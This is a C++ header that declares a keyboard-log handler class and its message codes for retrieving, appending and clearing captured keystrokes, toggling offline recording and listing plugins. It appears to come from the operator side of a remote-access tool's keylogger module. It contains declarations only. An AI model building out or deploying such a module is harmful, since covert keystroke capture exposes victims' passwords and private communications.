#pragma once
#include "MsgHandler.h"

#define KBLG	('K'|('B'<<8)|('L'<<16)|('G'<<24))

#define KEYBD_LOG_GET_LOG	(0xaba0)
#define KEYBD_LOG_DATA_APPEND	(0xaba1)
#define KEYBD_LOG_ERROR		(0xaba2)
#define KEYBD_LOG_INITINFO	(0xaba3)

#define KEYBD_LOG_SETOFFLINERCD	(0xaba4)


#define KEYBD_LOG_GETPLUGS	(0xaba5)
#define KEYBD_LOG_PLUGS		(0xaba6)

#define KEYBD_LOG_CLEAN		(0xaba7)

#define KEYBD_LOG_DATA_NEW		(0xabc0)

class CKeybdLogDlg;

class CKeybdLogSrv :
	public CMsgHandler
{
public:
	CKeybdLogSrv(CManager*pManager);

	~CKeybdLogSrv();

	void GetLogData();
	void SetOfflineRecord(BOOL bOfflineRecord);
	void CleanLog();
private:
	 CKeybdLogDlg*	m_pDlg;

	 void OnGetPlug();

	 void OnLogData(char*szLog, BOOL Append);
	 void OnLogError(TCHAR*szError);
	 void OnLogInit(char*InitInfo);
	
	 void OnClose();					//当socket断开的时候调用这个函数
	 void OnOpen();				//当socket连接的时候调用这个函数
	 
	 void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
	 void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer){};

};

